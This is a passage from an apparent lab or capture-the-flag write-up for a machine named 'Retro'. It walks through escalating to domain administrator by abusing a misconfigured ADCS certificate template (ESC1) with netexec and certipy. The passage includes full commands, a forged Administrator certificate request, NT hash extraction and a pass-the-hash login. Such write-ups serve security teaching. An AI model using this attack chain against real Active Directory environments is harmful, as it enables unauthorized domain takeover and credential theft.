➜  retro nxc smb $ip -u 'banking$' -p 'Password123'
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.88.241    445    DC               [+] retro.vl\banking$:Password123
```

Now that we have working credentials for the `banking$` computer account, we can do additional enumeration. One thing to check is Active Directory Certificate Services (ADCS). A quick check with `netexec` shows that ADCS is in use. 

```console
➜  retro nxc ldap $ip -u 'banking$' -p 'Password123' -M adcs
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        10.10.88.241    389    DC               [+] retro.vl\banking$:Password123
ADCS        10.10.88.241    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.88.241    389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.10.88.241    389    DC               Found CN: retro-DC-CA
```

## Privilege Escalation

Knowing that ADCS is in use, we can enumerate vulnerable templates with `certipy`. It looks like there's a template that's misconfigured to be vulnerable to an escalation method known as `ESC1`. The main issue with this misconfiguration is the ability for the attacker to specify a different `subjectAltName` (SAN) when making the certificate request, essentially allowing the attacker to request a certificate as any user in the domain. In order to abuse ESC1, the following must be true:

- Low privileged users are granted enrollment rights
- Manager approval is not required
- No authorized signatures are required
- The certificate template defines EKUs that enable authentication
- Requestors are able to specify a SAN when requesting the certificate

```console
➜  retro certipy find -dc-ip $ip -u 'banking$' -p 'Password123' -enabled -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

So reviewing the `RetroClients` template, we can observe the following:

- ✅ `RETRO.VL\Domain Computers` have enrollment rights - we control the `banking$` computer account. 
- ✅ `Requires Manager Approval` is set to `False`
- ✅ `Authorized Signatures Required` is set to `0`
- ✅ The `Extended Key Usage` is set to `Client Authentication` meaning we can use this certificate to authenticate in the domain
- ✅ The `Enrollee Supplies Subject` is set to `True`, meaning that requestors can specify a SAN. 

Now that we know the `RetroClients` template is vulnerable to ESC1, we can request a certificate with `certipy`. 

```console
➜  retro certipy req -dc-ip $ip -u 'banking$' -p 'Password123' -ca retro-DC-CA -template RetroClients -upn Administrator -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now we can authenticate using that certificate. 

```console
➜  retro certipy auth -pfx administrator.pfx -username administrator -domain retro.vl -dc-ip $ip
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Perfect! We've got an NTLM hash for the domain administrator. We can pass that hash with `netexec`. Here we find that we're able to authenticate with that NT hash, and that we do in fact have administrative access on the machine, indicated by `(Pwn3d!)`. We can now use that hash to log in as the administrator and grab the last flag. 

```console
➜  retro nxc smb $ip -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.88.241    445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
```



